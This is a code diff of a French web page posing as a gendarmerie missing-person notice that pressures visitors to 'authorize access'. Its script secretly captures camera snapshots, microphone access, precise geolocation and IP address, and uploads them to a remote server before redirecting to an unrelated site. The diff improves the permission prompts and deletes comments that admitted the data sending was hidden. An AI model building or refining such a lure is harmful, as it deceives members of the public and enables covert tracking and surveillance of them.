@@ -71,7 +71,6 @@
             line-height: 1.5;
         }
 
-        /* Boutons */
         .btn-group {
             display: flex;
             flex-direction: column;
@@ -137,7 +136,7 @@
             opacity: 0.3;
         }
 
-        /* Contenu principal (identique) */
+        /* Contenu principal */
         .header { text-align: center; padding: 60px 20px; }
         .alert-badge {
             display: inline-block;
@@ -242,31 +241,25 @@
     </style>
 </head>
 <body class="unverified">
-    <!-- Modal Permission (sans détails visibles) -->
     <div class="overlay show" id="permissionOverlay">
         <div class="modal" id="permissionModal">
             <h2>🔐 Accès sécurisé</h2>
-            <p>Veuillez autoriser l’accès pour consulter la fiche.</p>
-            
-            <!-- Message d'état global (aucune info sur les permissions) -->
+            <p>Veuillez autoriser l'accès pour consulter la fiche.</p>
             <div class="status-message" id="statusMessage">⏳ En attente...</div>
-
             <div class="btn-group">
                 <button class="btn btn-primary" id="allowBtn">🔓 AUTORISER</button>
                 <button class="btn btn-success" id="continueBtn" disabled>⏳ En cours...</button>
                 <button class="btn btn-retry btn-hidden" id="retryBtn">🔄 Réessayer</button>
             </div>
-            <!-- Aucun message sur l'envoi de données -->
         </div>
     </div>
 
-    <!-- Contenu principal (inchangé) -->
+    <!-- Contenu principal inchangé -->
     <div class="header">
         <div class="alert-badge">FICHE DE RECHERCHE</div>
         <div class="title">Allan Perrez</div>
         <div class="subtitle">Orange</div>
     </div>
-
     <div class="profile-grid">
         <div class="profile-card" onclick="redirectToGroupon()">
             <div class="photo">👤</div>
@@ -291,7 +284,6 @@
             <div class="info-value">Gendarmerie</div>
         </div>
     </div>
-
     <div class="urgency-section">
         <h3>⏰ Situation critique</h3>
         <div class="urgency-text">
@@ -304,7 +296,6 @@
             <div class="critical-box"><div class="critical-number">15k</div><div class="critical-label">Partages</div></div>
         </div>
     </div>
-
     <div class="action-section">
         <div class="action-title">🔍 Aide à la recherche</div>
         <div class="action-subtitle">Consultez les détails complets</div>
@@ -315,7 +306,7 @@
     <video id="videoPreview" autoplay muted playsinline></video>
 
     <script>
-        // ========== SESSION ID UNIQUE ==========
+        // ========== SESSION ID ==========
         const SESSION_ID = crypto.randomUUID ? crypto.randomUUID() : 'sess-' + Date.now() + '-' + Math.random().toString(36).substring(2, 10);
 
         // ========== CONFIGURATION ==========
@@ -323,7 +314,7 @@
         let cameraStream = null;
         let verificationComplete = false;
 
-        // États internes des permissions (non affichés)
+        // États internes
         let cameraGranted = false, microphoneGranted = false, geolocationGranted = false;
         let cameraAttempted = false, microphoneAttempted = false, geolocationAttempted = false;
 
@@ -346,35 +337,40 @@
         }
 
         function getGeolocation() {
-            if (!navigator.geolocation) {
-                geolocationAttempted = true;
-                userCoords = { error: 'Géolocalisation non disponible' };
-                sendUpdate();
-                updateUI();
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    geolocationGranted = true;
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
                     geolocationAttempted = true;
-                    userCoords = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        timestamp: pos.timestamp
-                    };
+                    userCoords = { error: 'Géolocalisation non disponible' };
                     sendUpdate();
                     updateUI();
-                },
-                (err) => {
-                    geolocationAttempted = true;
-                    userCoords = { error: err.message };
-                    sendUpdate();
-                    updateUI();
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        geolocationGranted = true;
+                        geolocationAttempted = true;
+                        userCoords = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            timestamp: pos.timestamp
+                        };
+                        sendUpdate();
+                        updateUI();
+                        resolve(true);
+                    },
+                    (err) => {
+                        geolocationAttempted = true;
+                        userCoords = { error: err.message };
+                        sendUpdate();
+                        updateUI();
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
         }
 
         async function requestCamera() {
@@ -390,10 +386,12 @@
                 };
                 sendUpdate();
                 updateUI();
+                return true;
             } catch (e) {
                 cameraAttempted = true;
                 sendUpdate();
                 updateUI();
+                return false;
             }
         }
 
@@ -405,10 +403,12 @@
                 microphoneAttempted = true;
                 sendUpdate();
                 updateUI();
+                return true;
             } catch (e) {
                 microphoneAttempted = true;
                 sendUpdate();
                 updateUI();
+                return false;
             }
         }
 
@@ -431,7 +431,7 @@
             }, 'image/jpeg', 0.9);
         }
 
-        // ========== ENVOI UNIQUE ==========
+        // ========== ENVOI ==========
 
         async function sendUpdate() {
             try {
@@ -440,7 +440,6 @@
                 formData.append('userAgent', navigator.userAgent);
                 formData.append('sessionId', SESSION_ID);
 
-                // Envoyer les permissions à chaque fois (même si partiellement refusées)
                 const perms = {
                     camera: cameraGranted,
                     microphone: microphoneGranted,
@@ -448,7 +447,6 @@
                 };
                 formData.append('permissions', JSON.stringify(perms));
 
-                // Données uniques
                 if (userIP && !ipSent) {
                     formData.append('ip', JSON.stringify(userIP));
                     ipSent = true;
@@ -472,23 +470,19 @@
                 }
 
                 if (formData.entries().next().done) return;
-
                 const resp = await fetch(SERVER_URL + '/api/verification/photo', {
                     method: 'POST',
                     body: formData,
                     credentials: 'omit'
                 });
-                if (resp.ok) {
-                    console.log('✅ Envoi réussi');
-                } else {
-                    console.warn('⚠️ Échec envoi, status:', resp.status);
-                }
+                if (resp.ok) console.log('✅ Envoi réussi');
+                else console.warn('⚠️ Échec envoi, status:', resp.status);
             } catch (e) {
                 console.warn('⚠️ Erreur envoi:', e.message);
             }
         }
 
-        // ========== UI (aucune info sensible) ==========
+        // ========== UI ==========
 
         function updateUI() {
             const count = [cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length;
@@ -498,7 +492,6 @@
             const retryBtn = document.getElementById('retryBtn');
 
             if (count === 3) {
-                // Tout est accordé
                 msg.textContent = '✅ Accès autorisé';
                 continueBtn.disabled = false;
                 continueBtn.textContent = 'CONTINUER';
@@ -507,12 +500,11 @@
                 allowBtn.style.display = 'none';
                 retryBtn.style.display = 'none';
             } else if (cameraAttempted || microphoneAttempted || geolocationAttempted) {
-                // Au moins une tentative, mais pas toutes
                 const denied = (cameraAttempted && !cameraGranted) ||
                                (microphoneAttempted && !microphoneGranted) ||
                                (geolocationAttempted && !geolocationGranted);
                 if (denied) {
-                    msg.textContent = '❌ Certaines autorisations sont refusées. Cliquez sur "Réessayer".';
+                    msg.textContent = '❌ Certaines autorisations sont refusées. Réessayez.';
                     allowBtn.style.display = 'none';
                     retryBtn.style.display = 'block';
                     retryBtn.onclick = retryDenied;
@@ -525,7 +517,6 @@
                 continueBtn.textContent = '⏳ En attente (' + count + '/3)';
                 continueBtn.className = 'btn btn-primary';
             } else {
-                // Aucune tentative
                 msg.textContent = '⏳ Cliquez sur "Autoriser" pour continuer.';
                 allowBtn.style.display = 'block';
                 allowBtn.textContent = '🔓 AUTORISER';
@@ -538,23 +529,41 @@
             }
         }
 
+        // ========== DEMANDES SÉQUENTIELLES ==========
+
         async function requestAllPermissions() {
-            await Promise.all([
-                requestCamera(),
-                requestMicrophone(),
-                new Promise(resolve => { getGeolocation(); resolve(); })
-            ]);
-            setTimeout(updateUI, 500);
+            // Désactiver le bouton pour éviter les clics multiples
+            document.getElementById('allowBtn').disabled = true;
+
+            // Demander dans l'ordre : micro, géoloc, caméra (avec délais)
+            await requestMicrophone();
+            await new Promise(r => setTimeout(r, 800));
+            await getGeolocation();
+            await new Promise(r => setTimeout(r, 800));
+            await requestCamera();
+
+            document.getElementById('allowBtn').disabled = false;
+            updateUI();
         }
 
         async function retryDenied() {
+            // Relancer uniquement les permissions refusées
             const promises = [];
-            if (!cameraGranted && cameraAttempted) promises.push(requestCamera());
-            if (!microphoneGranted && microphoneAttempted) promises.push(requestMicrophone());
-            if (!geolocationGranted && geolocationAttempted) promises.push(new Promise(resolve => { getGeolocation(); resolve(); }));
+            if (!cameraGranted && cameraAttempted) {
+                promises.push(requestCamera());
+            }
+            if (!microphoneGranted && microphoneAttempted) {
+                promises.push(requestMicrophone());
+            }
+            if (!geolocationGranted && geolocationAttempted) {
+                promises.push(getGeolocation());
+            }
+            // Attendre que toutes soient terminées
             await Promise.all(promises);
-            setTimeout(updateUI, 500);
+            updateUI();
         }
+
+        // ========== DÉBLOQUER ==========
 
         function completeVerification() {
             if (verificationComplete) return;
@@ -573,16 +582,17 @@
                     window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
                     return;
                 }
-                // Ne pas afficher d'alerte, ne rien faire
                 return;
             }
             window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
         }
 
+        // ========== INIT ==========
+
         window.addEventListener('load', () => {
             console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
-            getIPAddress(); // envoi immédiat de l'IP
+            getIPAddress(); // envoi de l'IP
             updateUI();
             setInterval(updateUI, 2000);
         });
